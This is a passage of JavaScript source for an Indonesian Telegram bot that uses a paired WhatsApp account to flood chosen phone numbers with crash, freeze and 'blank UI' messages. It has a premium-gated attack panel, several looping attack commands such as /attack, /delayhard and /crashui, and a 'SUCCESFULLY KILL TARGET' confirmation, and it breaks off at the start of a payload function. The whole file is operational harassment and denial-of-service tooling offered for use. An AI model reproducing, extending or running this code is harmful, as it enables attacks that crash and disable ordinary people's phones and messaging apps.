      `<blockquote><pre>⬡═―—⊱ ⎧ DARTH VADER ⎭ ⊰―—═⬡</pre></blockquote>
▢ Target: ${q}
▢ Type: Unknown Func
▢ Success: ${successCount}x
▢ Error: ${errorCount}x
${errorCount > 0 ? `▢ Last Error: ${lastError}` : ""}
▢ Status: ${errorCount === 0 ? "Success Bug" : "Ada Error"}
╘═——————————————═⬡`;

    try {
      await ctx.editMessageCaption(finalText, {
        message_id: processMessageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "! Check", url: `https://wa.me/${q}` }]
          ]
        }
      });
    } catch (e) {
      await ctx.replyWithPhoto(thumbnailUrl, {
        caption: finalText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "! Check", url: `https://wa.me/${q}` }]
          ]
        }
      });
    }

  } catch (err) {
    console.error(err);
    ctx.reply(`💥 Fatal Error: ${err.message}`).catch(()=>{});
  }
});

// ===== HANDLER BUKA MENU =====
bot.command("custombug2", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Example: /custombug2 62xxx,62xxx");

  const numbers = q.split(",")
    .map(v => v.replace(/[^0-9]/g, ''))
    .filter(v => v.length > 5);

  if (!numbers.length) return ctx.reply("❌ Nomor tidak valid");

  const targets = numbers.map(v => `${v}@s.whatsapp.net`);

  multiBugSession.set(ctx.from.id, {
    targets,
    numbers,
    selected: []
  });

  await ctx.replyWithPhoto("https://c.termai.cc/i125/ACFDN.jpg", {
    caption: `⚡ *MULTI BUG PANEL*\n\n🎯 Target (${numbers.length}):\n${numbers.map(v => `• ${v}`).join("\n")}\n\nPilih bug lalu tekan EXECUTE`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: buildButtons(ctx.from.id)
    }
  });
});

// ===== SISA KODE KAMU TETEP SAMA =====
// ... (function buildButtons, updateMulti, regex cb3bug, dll)
// ... (togglePages, command custombug1, formatPanel, buildMenu, update, toggle, slide, execute)
// ===== BUTTON =====
function buildButtons(userId) {
  const s = multiBugSession.get(userId);
  const isOn = (b) => s.selected.includes(b) ? "⭐" : "⬜";

  const btn = (b, name) => ({
    text: `${isOn(b)} ${name}`,
    callback_data: `cb3bug|${b}` // 🔥 prefix unik
  });

  return [
    [btn("forceclick","FORCECLICK"), btn("delay","DELAY"), btn("blank","BLANK")],
    //[btn("drain","DRAIN"), btn("buldo","BULLDO"), btn("ui","UI")],
    //[btn("video","VIDEO"), btn("lmsg","1 MSG"), btn("visible","VISIBLE")],
    //[btn("lckchat","LOCK CHAT"), btn("locaui","LOCA UI"), btn("imageui","IMAGE UI")],
    //[btn("iosui","IOS UI"), btn("ios","IOS"), btn("fcbeta","BETA")],
    [
      { text: "🚀 EXECUTE", callback_data: "cb3bug|exec" }
    ]
  ];
}

// ===== UPDATE =====
async function updateMulti(ctx) {
  await ctx.telegram.editMessageReplyMarkup(
    ctx.callbackQuery.message.chat.id,
    ctx.callbackQuery.message.message_id,
    null,
    {
      inline_keyboard: buildButtons(ctx.from.id)
    }
  );
}

// ===== REGEX (ANTI TABRAKAN) =====
bot.action(/^cb3bug\|([^|]+)$/, async (ctx) => {
  const key = ctx.match[1];
  const s = multiBugSession.get(ctx.from.id);

  if (!s) return ctx.answerCbQuery("Session expired");

  // ===== EXECUTE =====
  if (key === "exec") {

    if (!s.selected.length) {
      return ctx.answerCbQuery("❌ Pilih bug!", { show_alert: true });
    }

    await ctx.answerCbQuery("🚀 EXECUTING...");

    try {

      for (const target of s.targets) {
        for (const bug of s.selected) {

          if (bug === "ios") {
            for (let i=0;i<100;i++){ await NewlasterFollCrashIos(sock,target); await sleep(1000); }
          }
          else if (bug === "delay") {
            for (let i=0;i<50;i++){ await delayyyyyy(sock, target); await sleep(1000); }
          }
          else if (bug === "video") {
            for (let i=0;i<40;i++){ await VideoFrezeeUiVnXV3(sock,target); await sleep(1500); }
          }
          else if (bug === "drain") {
            for (let i=0;i<100;i++){ await RazzxBuldozer(target); await sleep(1000); }
          }
          else if (bug === "buldo") {
            for (let i=0;i<100;i++){ await RazzxBuldozer(target); await sleep(1000); }
          }
          else if (bug === "ui") {
            for (let i=0;i<100;i++){ await SennUiOverload(target); await sleep(1000); }
          }
          else if (bug === "blank") {
            await blankuiiiiii(sock, target);
          }
          else if (bug === "lmsg") {
            await blankuiiiiii(sock, target);
          }
          else if (bug === "visible") {
            for (let i=0;i<50;i++){ await delayyyyyy(sock, target); await sleep(1000); }
          }
          else if (bug === "lckchat") {
            await VnXLockChat(sock,target);
          }
          else if (bug === "locaui") {
            await OneTapLoca(sock,target);
          }
          else if (bug === "imageui") {
            await ImageFrezeeUi(sock,target);
          }
          else if (bug === "iosui") {
            await SennUiOverload(target);
          }
          else if (bug === "forceclick") {
            await fcclick(sock, target);
          }
          else if (bug === "fcbeta") {
            await VnXCrashMetaLastBeta(sock,target);
          }

        }
        await sleep(1500);
      }

      await ctx.reply(`✅ DONE\nTarget: ${s.targets.length}\nBug: ${s.selected.join(", ")}`);

    } catch (err) {
      console.error(err);
      await ctx.reply("❌ Error saat eksekusi");
    }

    return;
  }

  // ===== TOGGLE =====
  const i = s.selected.indexOf(key);

  if (i > -1) s.selected.splice(i, 1);
  else s.selected.push(key);

  await updateMulti(ctx);
  await ctx.answerCbQuery(`${key.toUpperCase()} ${i > -1 ? "OFF" : "ON"} ⭐`);
});
// CUSTOMBUG 2
// ===== PAGE DATA (UPGRADE JADI 5 PAGE) =====
const togglePages = {
  1: ["forceclick", "delay", "blank"],
 // 2: ["drain", "buldo", "ui"],
  //3: ["lmsg", "visible", "lckchat"],
  //4: ["locaui", "imageui", "iosui"],
  //5: ["ios", "fcbeta", "video"]
};

bot.command("custombug1", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const q = args[1];
  if (!q) return ctx.reply("Example: /custombug1 62xxx");

  const cleanNumber = q.replace(/\D/g, "");
  const finalNumber = `${cleanNumber}@s.whatsapp.net`;

  attackConfig.set(ctx.from.id, {
    target: finalNumber,
    number: cleanNumber,
    page: 1,

    //ios: false,
    delay: false,
    //video: false,
    //drain: false,
    //buldo: false,
    //ui: false,

    //lmsg: false,
    //visible: false,
    //lckchat: false,
    //locaui: false,
    //imageui: false,
    //iosui: false,
    forceclick: false,
    //fcbeta: false,
    blank: false
  });

  const s = attackConfig.get(ctx.from.id);

  await ctx.replyWithPhoto("https://files.catbox.moe/yfwfq2.png", {
    caption: formatPanel(s),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: buildMenu(s)
    }
  });
});

// ===== FORMAT =====
function formatPanel(s) {
  const icon = (v) => v ? "⭐" : "⬜";

  return `⚡ *ATTACK CONTROL PANEL* ⚡\n\n` +
         `📄 Page : ${s.page}/5\n\n` +

         `🔥 STATUS\n` +
         //`• IOS       : ${icon(s.ios)}\n` +
         `• DELAY     : ${icon(s.delay)}\n` +
         //`• VIDEO     : ${icon(s.video)}\n` +
         //`• DRAIN     : ${icon(s.drain)}\n` +
         //`• BULLDOZER : ${icon(s.buldo)}\n` +
         //`• UI        : ${icon(s.ui)}\n` +
         //`• 1 MSG     : ${icon(s.lmsg)}\n` +
         //`• VISIBLE   : ${icon(s.visible)}\n` +
         //`• LOCKCHAT  : ${icon(s.lckchat)}\n` +
         //`• LOCA UI   : ${icon(s.locaui)}\n` +
         //`• IMAGE UI  : ${icon(s.imageui)}\n` +
         //`• IOS UI    : ${icon(s.iosui)}\n` +
         `• FORCECLICK       : ${icon(s.forceclick)}\n` +
         //`• BETA      : ${icon(s.fcbeta)}\n` +
         `• BLANK     : ${icon(s.blank)}\n`;
}

// ===== BUTTON =====
function buildMenu(s) {
  const btn = (key) => ({
    text: `${s[key] ? "⭐" : "⬜"} ${key.toUpperCase()}`,
    callback_data: `toggle_${key}`
  });

  const current = togglePages[s.page];
  const keyboard = [];

  for (let i = 0; i < current.length; i += 2) {
    const row = [];
    row.push(btn(current[i]));
    if (current[i + 1]) row.push(btn(current[i + 1]));
    keyboard.push(row);
  }

  keyboard.push([
    //{ text: "⬅️", callback_data: `custombug1_page_${s.page - 1}:${s.target}` },
    //{ text: `📄 ${s.page}/5`, callback_data: "noop" },
    //{ text: "➡️", callback_data: `custombug1_page_${s.page + 1}:${s.target}` }
  ]);

  keyboard.push([
    { text: "🚀 EXECUTE", callback_data: `custombug1_exec:${s.target}` }
  ]);

  return keyboard;
}

// ===== UPDATE =====
async function update(ctx, s) {
  await ctx.telegram.editMessageCaption(
    ctx.callbackQuery.message.chat.id,
    ctx.callbackQuery.message.message_id,
    null,
    formatPanel(s),
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: buildMenu(s)
      }
    }
  );
}

// ===== TOGGLE =====
bot.action(/^toggle_(.+)$/, async (ctx) => {
  const key = ctx.match[1];
  const s = attackConfig.get(ctx.from.id);
  if (!s) return ctx.answerCbQuery("Session expired");

  if (!(key in s)) return ctx.answerCbQuery("Invalid");

  s[key] = !s[key];

  await update(ctx, s);
  await ctx.answerCbQuery(`${key.toUpperCase()} ${s[key] ? "ON ⭐" : "OFF"}`);
});

// ===== SLIDE =====
bot.action(/^custombug1_page_(\d+):(.+)$/, async (ctx) => {
  const page = parseInt(ctx.match[1]);
  const s = attackConfig.get(ctx.from.id);
  if (!s) return ctx.answerCbQuery("Session expired");

  if (page < 1 || page > 5) return ctx.answerCbQuery();

  s.page = page;

  await update(ctx, s);
  await ctx.answerCbQuery(`Page ${page}`);
});

// ===== EXECUTE =====
bot.action(/^custombug1_exec:(.+)$/, async (ctx) => {
  const target = ctx.match[1];
  const s = attackConfig.get(ctx.from.id);
  if (!s) return ctx.answerCbQuery("Session expired");

  await ctx.answerCbQuery("🚀 EXECUTING...");

  try {

    if (s.ios) for (let i=0;i<100;i++){ await NewlasterFollCrashIos(sock,target); await sleep(1000);}
    if (s.delay) for (let i=0;i<50;i++){ await delayyyyyy(sock, target); await sleep(1000);}
    if (s.video) for (let i=0;i<40;i++){ await VideoFrezeeUiVnXV3(sock,target); await sleep(1500);}
    if (s.drain) for (let i=0;i<100;i++){ await RazzxBuldozer(target); await sleep(1000);}
    if (s.buldo) for (let i=0;i<100;i++){ await RazzxBuldozer(target); await sleep(1000);}
    if (s.ui) for (let i=0;i<100;i++){ await SennUiOverload(target); await sleep(1000);}

    if (s.lmsg) for (let i=0;i<1;i++){ await blankuiiiiii(sock, target); await sleep(1000);}
    if (s.visible) for (let i=0;i<50;i++){ await delayyyyyy(sock, target); await sleep(1000);}
    if (s.lckchat) for (let i=0;i<50;i++){ await VnXLockChat(sock,target); await sleep(1000);}
    if (s.locaui) for (let i=0;i<50;i++){ await OneTapLoca(sock,target); await sleep(1000);}
    if (s.imageui) for (let i=0;i<50;i++){ await ImageFrezeeUi(sock,target); await sleep(1000);}
    if (s.iosui) for (let i=0;i<50;i++){ await SennUiOverload(target); await sleep(1000);}
    if (s.forceclick) for (let i=0;i<20;i++){ await fcclick(sock, target); await sleep(1000);}
    if (s.fcbeta) for (let i=0;i<50;i++){ await VnXCrashMetaLastBeta(sock,target); await sleep(1000);}
    if (s.blank) for (let i=0;i<15;i++){ await blankuiiiiii(sock, target); await sleep(1000);}
    
    await ctx.reply(`✅ ATTACK FINISHED`);

  } catch (err) {
    console.error(err);
    await ctx.reply("❌ Error saat eksekusi");
  }
});
//////// -- CASE BUG SELECT BUTTON BUG --- \\\\\\\\\\\
let lastTarget = {}; // simpen nomor biar kebaca di action

bot.command("attack", checkWhatsAppConnection, checkPremium, async (ctx) => {

  const chatId = ctx.chat.id;
  
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";

  const args = ctx.message.text.split(" "); // 🔥 FIX
  const q = args[1];
  if (!q) return ctx.reply("Example: /attack 62xxx");

  const cleanNumber = args[1].replace(/[^0-9]/g, '');
  const finalNumber = `${cleanNumber}@s.whatsapp.net`;

  lastTarget[ctx.from.id] = cleanNumber; // 🔥 simpen

  const waStatus = sock && sock.user
    ? "On Boss"
    : "Ga On Jir"; 

  const caption = `
「©️ @dickxmod 」
⫹⫺ - +${cleanNumber}
⫹⫺ - Date : ${new Date().toLocaleDateString()}
⫹⫺ - Status Sender : ${waStatus}
⫹⫺ - 𝗦𝗘𝗟𝗘𝗖𝗧 𝗧𝗛𝗘 𝗕𝗨𝗧𝗢𝗡 𝗕𝗨𝗚
`;

  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "𝗙𝗢𝗥𝗖𝗘 𝗖𝗟𝗜𝗖𝗞 👻", callback_data: `attack_fcclik:${finalNumber}` },
          { text: "𝗗𝗘𝗟𝗔𝗬 𝗨𝗜 🧬", callback_data: `attack_delayui:${finalNumber}` }
        ],
        [
          //{ text: "𝗗𝗘𝗟𝗔𝗬 𝗜𝗣𝗛𝗢𝗡𝗘 📱", callback_data: `attack_delayios:${finalNumber}` },
          //{ text: "𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟 𝗗𝗘𝗟𝗔𝗬 🫀", callback_data: `attack_chidorkk:${finalNumber}` }
        ],
        [
          //{ text: "𝗗𝗥𝗔𝗜𝗡 𝗞𝗨𝗢𝗧𝗔 🔥", callback_data: `attack_buldozer:${finalNumber}` },
          //{ text: "𝗕𝗟𝗔𝗡𝗞 𝟭 𝗠𝗦𝗚 🎁", callback_data: `attack_chidoriii:${finalNumber}` }
        ],
        [
          //{ text: "𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟 𝟭𝟭 🗯️", callback_data: `attack_protocoll:${finalNumber}` },
          //{ text: "𝗢𝗩𝗘𝗥𝗟𝗢𝗔𝗗 𝗦𝗬𝗦𝗧𝗘𝗠 🦠", callback_data: `attack_jjmbudd:${finalNumber}` }
        ],
        [
          //{ text: "𝗢𝗩𝗘𝗥𝗟𝗢𝗔𝗗 𝗜𝗣𝗛𝗢𝗡𝗘 👽", callback_data: `attack_delayui:${finalNumber}` },
          //{ text: "𝗢𝗩𝗘𝗥𝗟𝗢𝗔𝗗 𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡 💣", callback_data: `attack_uinibos:${finalNumber}` }
        ],
        [
          { text: "𝗕𝗟𝗔𝗡𝗞 𝗨𝗜 🥶", callback_data: `attack_chidoruu:${finalNumber}` }
        ]
      ]
    }
  };

  await ctx.replyWithPhoto("https://files.catbox.moe/yfwfq2.png", {
    caption,
    ...keyboard,
  });
});

bot.action(/^attack_(\w+):(.+)$/, checkPremium, async (ctx) => {
  const bugType = ctx.match[1];
  const target = ctx.match[2];

  const cleanNumber = lastTarget[ctx.from.id]; // 🔥 ambil lagi

  await ctx.answerCbQuery();

  try {
    switch (bugType) {
      case "chidorkk":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await delayyyyyy(sock, target);
          await sleep(1500);
        }
        break;

      case "delayxinvis":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 40; i++) {
          await delayyyyyy(sock, target);
          await sleep(1000);
        }
        break;

      case "chidoruu":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 40; i++) {
          await VideoFrezeeUiVnXV3(sock, target);
          await sleep(2500);
        }
        break;

      case "chidoriii":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 1; i++) {
          await blankuiiiiii(sock, target);
          await sleep(1000);
        }
        break;

      case "protocoll":
      case "buldozer":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await RazzxBuldozer(target);
          await sleep(1000);
        }
        break;

      case "delayui":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 150; i++) {
          await SennUiOverload(target);
          await sleep(1000);
        }
        break;

      case "jjmbudd":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await SennUiOverload(target);
          await sleep(1500);
        }
        break;

      case "delayios":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await IPhoneDelay(target, true);
          await sleep(1000);
        }
        break;

      case "fcclik":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 20; i++) {
          await fcclick(sock, target);
          await sleep(1000);
        }
        break;

      case "delayui":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 50; i++) {
          await delayyyyyy(sock, target);
          await sleep(1000);
        }
        break;

      case "poseidon":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 50; i++) {
          await delayyyyyy(sock, target);
          await delayyyyyy(sock, target);
          await sleep(1000);
        }
        break;

      case "chidori":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 5; i++) {
          await blankuiiiiii(sock, target);
          await sleep(1000);
        }
        break;

      case "uinibos":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 50; i++) {
          await OneTapLoca(sock, target);
          await sleep(1000);
        }
        break;

      default:
        return ctx.reply("❌ Bug tidak ditemukan.");
    }

    await ctx.replyWithPhoto("https://files.catbox.moe/yfwfq2.png", {
      caption: `
「 SUCCESFULLY KILL TARGET 」
┏━━━━━━━━━━━━━━━━━━━━━━━━❍
┃╭────────────────────
┃│ Target Nomor : wa.me/${cleanNumber}
┃╰────────────────────
┗━━━━━━━━━━━━━━━━━━━━━━━❍
jeda 3/5 menit agar sender tidak terbanned
`
    });

  } catch (err) {
    console.error(err);
    await ctx.reply("Error Idiot, Liat Panel");
  }
});
//////// -- CASE BUG BIASA --- \\\\\\\\\\\
bot.command("delayhard", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /delayhard 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/yfwfq2.png", {
    caption: `
<blockquote>交 Darth Vader ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /delayhard 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 50; i++) {
      console.log(chalk.red(`Send Bug CurseDelay ${i + 1}/150 To ${q}`));
      await delayyyyyy(sock, target);
      await sleep(4500);
    }
  })();
});
bot.command("delayonehit", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /delayonehit 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/yfwfq2.png", {
    caption: `
<blockquote>交 Darth Vader ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /delayonehit 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 10; i++) {
      console.log(chalk.red(`Send Bug Delay One Hit ${i + 1}/10 To ${q}`));
      await delayyyyyy(sock, target);
      await sleep(7000);
      await delayyyyyy(sock, target);
      await sleep(8000);
    }
  })();
});
bot.command("iosattack", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /iosattack 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/yfwfq2.png", {
    caption: `
<blockquote>交 Darth Vader ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /iosattack 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 10; i++) {
      console.log(chalk.red(`Send Bug Delay iOs Free Spam ${i + 1}/10 To ${q}`));
      await IPhoneDelay(target, ptcp = true);
      await sleep(8000);
    }
  })();
});
bot.command("blankandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /blankandro 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/yfwfq2.png", {
    caption: `
<blockquote>交 Darth Vader ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /blankandro 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 1; i++) {
      console.log(chalk.red(`Send Bug Blank 1 Msg ${i + 1}/1 To ${q}`));
      await blankuiiiiii(sock, target);
      await sleep(1000);
    }
  })();
});
bot.command("crashui", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /crashui 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/yfwfq2.png", {
    caption: `
<blockquote>交 Darth Vader ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /crashui 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 50; i++) {
      console.log(chalk.red(`Send Bug Delay iOs Free Spam ${i + 1}/100 To ${q}`));
      await CrashNoClick(sock, target);
      await sleep(3000);
    }
  })();
});
bot.command("forseclikk", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /forseclikk 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/yfwfq2.png", {
    caption: `
<blockquote>交 Darth Vader ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /forseclikk 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 10; i++) {
      console.log(chalk.red(`Send Bug fcklik ${i + 1}/100 To ${q}`));
      await fcclick(sock, target);
      await sleep(1000);
    }
  })();
});
bot.command("uicrashiosi", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /uicrashiosi 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/yfwfq2.png", {
    caption: `
<blockquote>交 Darth Vader ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /uicrashiosi 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      console.log(chalk.red(`Send Bug Delay iOs Free Spam ${i + 1}/100 To ${q}`));
      await SennUiOverload(target);
      await sleep(3000);
    }
  })();
});
// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example: /addadmin 12345678"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});
bot.command("addprem", checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});
///=== comand del admin ===\\\
bot.command("deladmin", checkAdmin, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /deladmin 12345678"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /delprem 12345678"
    );
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});

// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("addsender", checkAdmin, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("❌ Format Salah!. Example : /addsender <nomor_wa>");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Whatsapp Sudah Terhubung");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "DILZOFFC");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃☇ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
┃☇ 𝗖𝗼𝗱𝗲 : <code>${formattedCode}</code>
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Developers", url: "https://t.me/dickxmod" }]],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});
///=== comand del sesi ===\\\\
bot.command("delsesi", (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("✅ Session berhasil di hapus, silahkan connect ulang");
  } else {
    ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
  }
});
////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}

////////// OWNER MENU \\\\\\\\\
bot.command("Status", checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});
/////////////////START FUNC/////////////////////////
async function fcclick(sock, target) {
    const Msg = {
            requestPaymentMessage: {
                currencyCodeIso4217: 'IDR',
